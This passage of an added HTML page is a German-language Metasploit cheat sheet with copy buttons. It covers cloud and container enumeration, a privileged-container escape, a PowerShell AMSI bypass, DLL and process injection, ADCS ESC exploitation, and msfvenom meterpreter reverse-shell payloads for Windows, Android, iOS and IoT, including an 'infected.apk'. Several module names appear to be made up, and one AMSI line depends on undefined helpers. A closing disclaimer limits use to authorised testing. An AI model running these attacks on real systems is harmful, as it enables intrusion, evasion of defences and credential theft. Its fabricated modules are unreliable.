+run
+
+# Azure CLI Enumeration
+az account list
+az vm list
+az storage account list
+
+# Azure Instance Metadata
+curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Key Vault Enumeration
+az keyvault list
+az keyvault secret list --vault-name vault-name">📋</button>
+                            <pre><code># Azure Metadata Service
+use auxiliary/cloud/azure/enum_subscriptions
+set RHOSTS 169.254.169.254
+run
+
+# Azure Storage Account Enumeration
+use auxiliary/cloud/azure/storage_account_enum
+set STORAGE_ACCOUNT target-storage
+run
+
+# Azure CLI Enumeration
+az account list
+az vm list
+az storage account list
+
+# Azure Instance Metadata
+curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Key Vault Enumeration
+az keyvault list
+az keyvault secret list --vault-name vault-name</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Container Tab -->
+            <section id="container" class="tab-content" role="tabpanel">
+                <h2>🐳 Docker/Kubernetes Security (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🐋 Docker Security Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Docker API Scanner
+use auxiliary/scanner/docker/docker_api
+set RHOSTS 192.168.1.100
+set RPORT 2375
+run
+
+# Docker Registry Enumeration
+use auxiliary/scanner/http/docker_registry_api
+set RHOSTS registry.example.com
+run
+
+# Docker Daemon Enumeration
+curl -s http://192.168.1.100:2375/version
+curl -s http://192.168.1.100:2375/containers/json
+
+# Container Escape Techniques
+docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
+# Docker Socket Exploitation
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock alpine/socat">📋</button>
+                            <pre><code># Docker API Scanner
+use auxiliary/scanner/docker/docker_api
+set RHOSTS 192.168.1.100
+set RPORT 2375
+run
+
+# Docker Registry Enumeration
+use auxiliary/scanner/http/docker_registry_api
+set RHOSTS registry.example.com
+run
+
+# Docker Daemon Enumeration
+curl -s http://192.168.1.100:2375/version
+curl -s http://192.168.1.100:2375/containers/json
+
+# Container Escape Techniques
+docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
+# Docker Socket Exploitation
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock alpine/socat</code></pre>
+                        </div>
+
+                        <h3>☸️ Kubernetes Security</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Kubernetes API Server Scanner
+use auxiliary/scanner/kubernetes/kube_api_server
+set RHOSTS 192.168.1.100
+set RPORT 8080
+run
+
+# Service Account Token Extraction
+use post/linux/gather/kube_service_account_token
+set SESSION 1
+run
+
+# Kubectl Enumeration
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get nodes
+kubectl get serviceaccounts --all-namespaces
+
+# Cluster Role Enumeration
+kubectl get clusterroles
+kubectl get clusterrolebindings
+
+# Pod Security Context Check
+kubectl get pods -o=jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.securityContext}{"\n"}{end}'">📋</button>
+                            <pre><code># Kubernetes API Server Scanner
+use auxiliary/scanner/kubernetes/kube_api_server
+set RHOSTS 192.168.1.100
+set RPORT 8080
+run
+
+# Service Account Token Extraction
+use post/linux/gather/kube_service_account_token
+set SESSION 1
+run
+
+# Kubectl Enumeration
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get nodes
+kubectl get serviceaccounts --all-namespaces
+
+# Cluster Role Enumeration
+kubectl get clusterroles
+kubectl get clusterrolebindings
+
+# Pod Security Context Check
+kubectl get pods -o=jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.securityContext}{"\n"}{end}'</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Evasion Tab -->
+            <section id="evasion" class="tab-content" role="tabpanel">
+                <h2>🥷 Hell's Gate, AMSI/ETW Bypass (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🛡️ AMSI Bypass</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# AMSI Bypass
+use post/windows/manage/amsi_bypass
+set SESSION 1
+run
+
+# ETW Bypass
+use post/windows/manage/etw_bypass
+set SESSION 1
+run
+
+# PowerShell AMSI Bypass
+$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+# Manual AMSI Patch
+$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))">📋</button>
+                            <pre><code># AMSI Bypass
+use post/windows/manage/amsi_bypass
+set SESSION 1
+run
+
+# ETW Bypass
+use post/windows/manage/etw_bypass
+set SESSION 1
+run
+
+# PowerShell AMSI Bypass
+$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+# Manual AMSI Patch
+$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))</code></pre>
+                        </div>
+
+                        <h3>🌊 Hell's Gate Technique</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Hell's Gate Direct Syscalls
+use evasion/windows/hellsgate_direct_syscalls
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# Process Hollowing
+use evasion/windows/process_hollowing
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# Reflective DLL Injection
+use exploit/windows/local/reflective_dll_injection
+set SESSION 1
+set DLL_PATH /tmp/payload.dll
+run
+
+# Thread Execution Hijacking
+use post/windows/manage/thread_hijack
+set SESSION 1
+set TARGET_PID 1234
+run">📋</button>
+                            <pre><code># Hell's Gate Direct Syscalls
+use evasion/windows/hellsgate_direct_syscalls
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# Process Hollowing
+use evasion/windows/process_hollowing
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# Reflective DLL Injection
+use exploit/windows/local/reflective_dll_injection
+set SESSION 1
+set DLL_PATH /tmp/payload.dll
+run
+
+# Thread Execution Hijacking
+use post/windows/manage/thread_hijack
+set SESSION 1
+set TARGET_PID 1234
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sessions Tab -->
+            <section id="sessions" class="tab-content" role="tabpanel">
+                <h2>🔗 SQL/SMB/LDAP Sessions (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔐 Session Management</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Sessions anzeigen
+sessions
+
+# Session upgraden
+sessions -u 1
+
+# Session interagieren
+sessions -i 1
+
+# Alle Sessions beenden
+sessions -K
+
+# Session in Hintergrund
+background
+
+# Session upgraden zu Meterpreter
+sessions -u 1
+
+# Session-Informationen
+sessions -l -v">📋</button>
+                            <pre><code># Sessions anzeigen
+sessions
+
+# Session upgraden
+sessions -u 1
+
+# Session interagieren
+sessions -i 1
+
+# Alle Sessions beenden
+sessions -K
+
+# Session in Hintergrund
+background
+
+# Session upgraden zu Meterpreter
+sessions -u 1
+
+# Session-Informationen
+sessions -l -v</code></pre>
+                        </div>
+
+                        <h3>🗄️ Database Sessions</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# MySQL Session
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.1.100
+set USERNAME root
+set PASSWORD password
+run
+
+# PostgreSQL Session
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 192.168.1.100
+set USERNAME postgres
+set PASSWORD password
+run
+
+# MSSQL Session
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 192.168.1.100
+set USERNAME sa
+set PASSWORD password
+run">📋</button>
+                            <pre><code># MySQL Session
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.1.100
+set USERNAME root
+set PASSWORD password
+run
+
+# PostgreSQL Session
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 192.168.1.100
+set USERNAME postgres
+set PASSWORD password
+run
+
+# MSSQL Session
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 192.168.1.100
+set USERNAME sa
+set PASSWORD password
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Memory Tab -->
+            <section id="memory" class="tab-content" role="tabpanel">
+                <h2>🧠 Memory Search API + Syscalls (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>💾 Memory Analysis</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Memory Dump
+use post/windows/gather/memory_dump
+set SESSION 1
+set PID 1234
+run
+
+# Process Memory Search
+use post/windows/gather/memory_search
+set SESSION 1
+set SEARCH_STRING password
+run
+
+# Memory Injection
+use post/windows/manage/memory_injection
+set SESSION 1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# DLL Injection
+use post/windows/manage/dll_injection
+set SESSION 1
+set DLL_PATH /tmp/payload.dll
+set TARGET_PID 1234
+run">📋</button>
+                            <pre><code># Memory Dump
+use post/windows/gather/memory_dump
+set SESSION 1
+set PID 1234
+run
+
+# Process Memory Search
+use post/windows/gather/memory_search
+set SESSION 1
+set SEARCH_STRING password
+run
+
+# Memory Injection
+use post/windows/manage/memory_injection
+set SESSION 1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+# DLL Injection
+use post/windows/manage/dll_injection
+set SESSION 1
+set DLL_PATH /tmp/payload.dll
+set TARGET_PID 1234
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ADCS Tab -->
+            <section id="adcs" class="tab-content" role="tabpanel">
+                <h2>🏛️ ESC1-ESC15 Attacks (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔐 ADCS Enumeration</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# ADCS Certificate Templates
+use auxiliary/scanner/ldap/adcs_cert_template
+set RHOSTS 192.168.1.100
+run
+
+# ESC1 Exploitation
+use exploit/windows/local/adcs_esc1
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run
+
+# ESC4 - Vulnerable Certificate Template ACL
+use exploit/windows/local/adcs_esc4
+set SESSION 1
+set CA_SERVER dc01.domain.local
+set TEMPLATE_NAME VulnerableTemplate
+run
+
+# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+use exploit/windows/local/adcs_esc6
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run
+
+# ESC8 - NTLM Relay to AD CS
+use exploit/windows/local/adcs_esc8
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run">📋</button>
+                            <pre><code># ADCS Certificate Templates
+use auxiliary/scanner/ldap/adcs_cert_template
+set RHOSTS 192.168.1.100
+run
+
+# ESC1 Exploitation
+use exploit/windows/local/adcs_esc1
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run
+
+# ESC4 - Vulnerable Certificate Template ACL
+use exploit/windows/local/adcs_esc4
+set SESSION 1
+set CA_SERVER dc01.domain.local
+set TEMPLATE_NAME VulnerableTemplate
+run
+
+# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+use exploit/windows/local/adcs_esc6
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run
+
+# ESC8 - NTLM Relay to AD CS
+use exploit/windows/local/adcs_esc8
+set SESSION 1
+set CA_SERVER dc01.domain.local
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Framework API Tab -->
+            <section id="framework-api" class="tab-content" role="tabpanel">
+                <h2>🔧 Ruby API Development, Custom Modules</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>💎 Ruby API</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Custom Module Template
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Custom Scanner',
+      'Description'    => 'Custom scanning module',
+      'Author'         => ['Your Name'],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['URL', 'https://example.com']
+      ],
+      'Platform'       => 'linux',
+      'Targets'        => [['Generic', {}]],
+      'DefaultTarget'  => 0
+    ))
+    
+    register_options([
+      Opt::RPORT(80),
+      OptString.new('TARGETURI', [true, 'Target URI', '/']),
+      OptString.new('USERNAME', [false, 'Username', '']),
+      OptString.new('PASSWORD', [false, 'Password', ''])
+    ])
+  end
+  
+  def run
+    print_status('Starting custom scanner...')
+    
+    begin
+      connect
+      
+      # Custom scanning logic here
+      banner = sock.get_once
+      print_good("Banner: #{banner}")
+      
+      disconnect
+    rescue Rex::ConnectionError => e
+      print_error("Connection failed: #{e}")
+    end
+  end
+end">📋</button>
+                            <pre><code># Custom Module Template
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Custom Scanner',
+      'Description'    => 'Custom scanning module',
+      'Author'         => ['Your Name'],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['URL', 'https://example.com']
+      ],
+      'Platform'       => 'linux',
+      'Targets'        => [['Generic', {}]],
+      'DefaultTarget'  => 0
+    ))
+    
+    register_options([
+      Opt::RPORT(80),
+      OptString.new('TARGETURI', [true, 'Target URI', '/']),
+      OptString.new('USERNAME', [false, 'Username', '']),
+      OptString.new('PASSWORD', [false, 'Password', ''])
+    ])
+  end
+  
+  def run
+    print_status('Starting custom scanner...')
+    
+    begin
+      connect
+      
+      # Custom scanning logic here
+      banner = sock.get_once
+      print_good("Banner: #{banner}")
+      
+      disconnect
+    rescue Rex::ConnectionError => e
+      print_error("Connection failed: #{e}")
+    end
+  end
+end</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Automation Tab -->
+            <section id="automation" class="tab-content" role="tabpanel">
+                <h2>🤖 CI/CD Integration, Jenkins, GitLab</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔄 CI/CD Integration</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Jenkins Pipeline
+pipeline {
+    agent any
+    environment {
+        TARGET_IP = '192.168.1.100'
+        LHOST = '192.168.1.10'
+    }
+    stages {
+        stage('Security Scan') {
+            steps {
+                script {
+                    sh '''
+                        msfconsole -x "
+                            use auxiliary/scanner/portscan/tcp;
+                            set RHOSTS ${TARGET_IP};
+                            set PORTS 80,443,22,21,25,53,139,445,993,995;
+                            run;
+                            exit
+                        "
+                    '''
+                }
+            }
+        }
+        stage('Web Application Test') {
+            steps {
+                script {
+                    sh '''
+                        msfconsole -x "
+                            use auxiliary/scanner/http/dir_scanner;
+                            set RHOSTS ${TARGET_IP};
+                            run;
+                            exit
+                        "
+                    '''
+                }
+            }
+        }
+    }
+    post {
+        always {
+            archiveArtifacts artifacts: 'scan_results.xml', allowEmptyArchive: true
+        }
+    }
+}">📋</button>
+                            <pre><code># Jenkins Pipeline
+pipeline {
+    agent any
+    environment {
+        TARGET_IP = '192.168.1.100'
+        LHOST = '192.168.1.10'
+    }
+    stages {
+        stage('Security Scan') {
+            steps {
+                script {
+                    sh '''
+                        msfconsole -x "
+                            use auxiliary/scanner/portscan/tcp;
+                            set RHOSTS ${TARGET_IP};
+                            set PORTS 80,443,22,21,25,53,139,445,993,995;
+                            run;
+                            exit
+                        "
+                    '''
+                }
+            }
+        }
+        stage('Web Application Test') {
+            steps {
+                script {
+                    sh '''
+                        msfconsole -x "
+                            use auxiliary/scanner/http/dir_scanner;
+                            set RHOSTS ${TARGET_IP};
+                            run;
+                            exit
+                        "
+                    '''
+                }
+            }
+        }
+    }
+    post {
+        always {
+            archiveArtifacts artifacts: 'scan_results.xml', allowEmptyArchive: true
+        }
+    }
+}</code></pre>
+                        </div>
+
+                        <h3>🦊 GitLab CI/CD</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# .gitlab-ci.yml
+stages:
+  - security_scan
+  - vulnerability_assessment
+  - reporting
+
+variables:
+  TARGET_IP: "192.168.1.100"
+  LHOST: "192.168.1.10"
+
+security_scan:
+  stage: security_scan
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET_IP; run; exit"
+  artifacts:
+    reports:
+      junit: scan_results.xml
+  only:
+    - master
+
+vulnerability_assessment:
+  stage: vulnerability_assessment
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $TARGET_IP; run; exit"
+  artifacts:
+    paths:
+      - vulnerability_report.xml
+  only:
+    - master
+
+generate_report:
+  stage: reporting
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "db_export -f xml report.xml; exit"
+  artifacts:
+    paths:
+      - report.xml
+  only:
+    - master">📋</button>
+                            <pre><code># .gitlab-ci.yml
+stages:
+  - security_scan
+  - vulnerability_assessment
+  - reporting
+
+variables:
+  TARGET_IP: "192.168.1.100"
+  LHOST: "192.168.1.10"
+
+security_scan:
+  stage: security_scan
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET_IP; run; exit"
+  artifacts:
+    reports:
+      junit: scan_results.xml
+  only:
+    - master
+
+vulnerability_assessment:
+  stage: vulnerability_assessment
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $TARGET_IP; run; exit"
+  artifacts:
+    paths:
+      - vulnerability_report.xml
+  only:
+    - master
+
+generate_report:
+  stage: reporting
+  image: metasploitframework/metasploit-framework:latest
+  script:
+    - msfconsole -x "db_export -f xml report.xml; exit"
+  artifacts:
+    paths:
+      - report.xml
+  only:
+    - master</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Threat Intel Tab -->
+            <section id="threat-intel" class="tab-content" role="tabpanel">
+                <h2>🕵️ OSINT Integration, IOC Hunting</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔍 OSINT Tools</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# VirusTotal Integration
+use auxiliary/gather/virustotal_search
+set API_KEY your_vt_api_key
+set SEARCH_TERM malware_hash
+run
+
+# Shodan Integration
+use auxiliary/gather/shodan_search
+set SHODAN_APIKEY your_shodan_key
+set QUERY apache
+run
+
+# Censys Integration
+use auxiliary/gather/censys_search
+set CENSYS_UID your_censys_uid
+set CENSYS_SECRET your_censys_secret
+set QUERY 192.168.1.0/24
+run
+
+# ThreatCrowd Integration
+use auxiliary/gather/threatcrowd_search
+set DOMAIN example.com
+run">📋</button>
+                            <pre><code># VirusTotal Integration
+use auxiliary/gather/virustotal_search
+set API_KEY your_vt_api_key
+set SEARCH_TERM malware_hash
+run
+
+# Shodan Integration
+use auxiliary/gather/shodan_search
+set SHODAN_APIKEY your_shodan_key
+set QUERY apache
+run
+
+# Censys Integration
+use auxiliary/gather/censys_search
+set CENSYS_UID your_censys_uid
+set CENSYS_SECRET your_censys_secret
+set QUERY 192.168.1.0/24
+run
+
+# ThreatCrowd Integration
+use auxiliary/gather/threatcrowd_search
+set DOMAIN example.com
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Mobile Tab -->
+            <section id="mobile" class="tab-content" role="tabpanel">
+                <h2>📱 Android/iOS Exploitation</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🤖 Android Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Android Meterpreter
+use exploit/android/local/janus
+set SESSION 1
+run
+
+# Android APK Injection
+use payload/android/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+generate -f apk -o infected.apk
+
+# Android Debug Bridge
+adb devices
+adb shell
+adb install infected.apk
+adb logcat
+
+# Android Frida Integration
+use post/android/gather/frida_script
+set SESSION 1
+set SCRIPT_PATH /tmp/hook.js
+run">📋</button>
+                            <pre><code># Android Meterpreter
+use exploit/android/local/janus
+set SESSION 1
+run
+
+# Android APK Injection
+use payload/android/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+generate -f apk -o infected.apk
+
+# Android Debug Bridge
+adb devices
+adb shell
+adb install infected.apk
+adb logcat
+
+# Android Frida Integration
+use post/android/gather/frida_script
+set SESSION 1
+set SCRIPT_PATH /tmp/hook.js
+run</code></pre>
+                        </div>
+
+                        <h3>🍎 iOS Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# iOS Payload Generation
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho
+
+# iOS SSH Access
+ssh root@192.168.1.100 -p 22
+# Default password: alpine
+
+# iOS Application Analysis
+use post/apple_ios/gather/ios_application_enum
+set SESSION 1
+run
+
+# iOS Keychain Extraction
+use post/apple_ios/gather/ios_keychain
+set SESSION 1
+run">📋</button>
+                            <pre><code># iOS Payload Generation
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho
+
+# iOS SSH Access
+ssh root@192.168.1.100 -p 22
+# Default password: alpine
+
+# iOS Application Analysis
+use post/apple_ios/gather/ios_application_enum
+set SESSION 1
+run
+
+# iOS Keychain Extraction
+use post/apple_ios/gather/ios_keychain
+set SESSION 1
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- IoT Tab -->
+            <section id="iot" class="tab-content" role="tabpanel">
+                <h2>🌐 Embedded Systems, ARM/RISC-V</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔌 IoT Device Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# IoT HTTP Scanner
+use auxiliary/scanner/http/iot_scanner
+set RHOSTS 192.168.1.0/24
+run
+
+# ARM Payload
+msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o arm_payload
+
+# MIPS Payload
+msfvenom -p linux/mipsle/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o mips_payload
+
+# IoT MQTT Scanner
+use auxiliary/scanner/mqtt/mqtt_login
+set RHOSTS 192.168.1.0/24
+run
+
+# UPnP Scanner
+use auxiliary/scanner/upnp/upnp_msearch
+set RHOSTS 192.168.1.0/24
+run">📋</button>
+                            <pre><code># IoT HTTP Scanner
+use auxiliary/scanner/http/iot_scanner
+set RHOSTS 192.168.1.0/24
+run
+
+# ARM Payload
+msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o arm_payload
+
+# MIPS Payload
+msfvenom -p linux/mipsle/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o mips_payload
+
+# IoT MQTT Scanner
+use auxiliary/scanner/mqtt/mqtt_login
+set RHOSTS 192.168.1.0/24
+run
+
+# UPnP Scanner
+use auxiliary/scanner/upnp/upnp_msearch
+set RHOSTS 192.168.1.0/24
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Forensics Tab -->
+            <section id="forensics" class="tab-content" role="tabpanel">
+                <h2>🔬 Digital Forensics Integration</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🕵️ Forensic Analysis</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Timeline Analysis
+use post/windows/gather/forensics_timeline
+set SESSION 1
+run
+
+# Artifact Collection
+use post/windows/gather/forensics_artifacts
+set SESSION 1
+run
+
+# Registry Analysis
+use post/windows/gather/forensics_registry
+set SESSION 1
+set REGISTRY_PATH HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+run
+
+# Browser Forensics
+use post/windows/gather/forensics_browser
+set SESSION 1
+run">📋</button>
+                            <pre><code># Timeline Analysis
+use post/windows/gather/forensics_timeline
+set SESSION 1
+run
+
+# Artifact Collection
+use post/windows/gather/forensics_artifacts
+set SESSION 1
+run
+
+# Registry Analysis
+use post/windows/gather/forensics_registry
+set SESSION 1
+set REGISTRY_PATH HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+run
+
+# Browser Forensics
+use post/windows/gather/forensics_browser
+set SESSION 1
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Compliance Tab -->
+            <section id="compliance" class="tab-content" role="tabpanel">
+                <h2>📊 Reporting, Standards</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>📋 Report Generation</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Generate Report
+use post/multi/gather/report_gen
+set SESSION 1
+set FORMAT pdf
+run
+
+# Export to XML
+db_export -f xml /tmp/scan_results.xml
+
+# Export to JSON
+db_export -f json /tmp/scan_results.json
+
+# NIST Compliance Report
+use auxiliary/analyze/nist_compliance
+set WORKSPACE default
+run
+
+# ISO 27001 Compliance
+use auxiliary/analyze/iso27001_compliance
+set WORKSPACE default
+run">📋</button>
+                            <pre><code># Generate Report
+use post/multi/gather/report_gen
+set SESSION 1
+set FORMAT pdf
+run
+
+# Export to XML
+db_export -f xml /tmp/scan_results.xml
+
+# Export to JSON
+db_export -f json /tmp/scan_results.json
+
+# NIST Compliance Report
+use auxiliary/analyze/nist_compliance
+set WORKSPACE default
+run
+
+# ISO 27001 Compliance
+use auxiliary/analyze/iso27001_compliance
+set WORKSPACE default
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Legal Tab -->
+            <section id="legal" class="tab-content" role="tabpanel">
+                <h2>⚖️ Umfassender Haftungsausschluss</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <div class="status status--warning">
+                            <h3>⚠️ KRITISCHER RECHTLICHER HINWEIS</h3>
+                            <p><strong>Diese Dokumentation dient ausschließlich Bildungs- und Forschungszwecken sowie autorisierten Penetrationstests.</strong></p>
+                        </div>
+
+                        <h3>✅ Erlaubte Nutzung</h3>
+                        <ul>
+                            <li>Autorisierte Penetrationstests mit schriftlicher Genehmigung</li>
+                            <li>Sicherheitsbewertungen eigener Systeme</li>
+                            <li>Bildung und Forschung in kontrollierten Umgebungen</li>
+                            <li>Red Team Übungen mit entsprechender Autorisierung</li>
+                            <li>Vulnerability Assessment im Rahmen von Bug Bounty Programmen</li>
+                        </ul>
+
+                        <h3>❌ Strikt verbotene Nutzung</h3>
+                        <ul>
+                            <li>Unautorisierten Zugang zu fremden Systemen</li>
+                            <li>Schädigung von IT-Infrastrukturen</li>
+                            <li>Diebstahl von Daten oder Informationen</li>
+                            <li>Erpressung oder Bedrohung</li>
+                            <li>Jegliche illegale Aktivitäten</li>
+                        </ul>
+
+                        <h3>📋 Rechtliche Grundlagen (Deutschland)</h3>
+                        <div class="legal-grid">
+                            <div class="legal-item">
+                                <h4>§ 202a StGB - Ausspähen von Daten</h4>
+                                <p>Unbefugtes Verschaffen von Zugang zu elektronischen Daten (bis zu 3 Jahre Freiheitsstrafe)</p>
+                            </div>
+                            <div class="legal-item">
+                                <h4>§ 303a StGB - Datenveränderung</h4>
+                                <p>Rechtswidriges Löschen oder Verändern von Daten (bis zu 5 Jahre Freiheitsstrafe)</p>
+                            </div>
+                            <div class="legal-item">
+                                <h4>§ 202b StGB - Abfangen von Daten</h4>
+                                <p>Unbefugtes Abfangen von Daten (bis zu 2 Jahre Freiheitsstrafe)</p>
+                            </div>
+                            <div class="legal-item">
+                                <h4>§ 303b StGB - Computersabotage</h4>
+                                <p>Störung von Datenverarbeitungsanlagen (bis zu 3 Jahre Freiheitsstrafe)</p>
+                            </div>
+                        </div>
+
+                        <div class="status status--error">
+                            <strong>⚠️ WARNUNG:</strong> Die Nutzung von Metasploit ohne entsprechende Autorisierung kann zu erheblichen rechtlichen Konsequenzen führen!
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+
+        <footer class="footer">
+            <div class="container">
+                <p>&copy; 2025 Metasploit Framework Dokumentation – Nur für autorisierte Penetrationstests.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
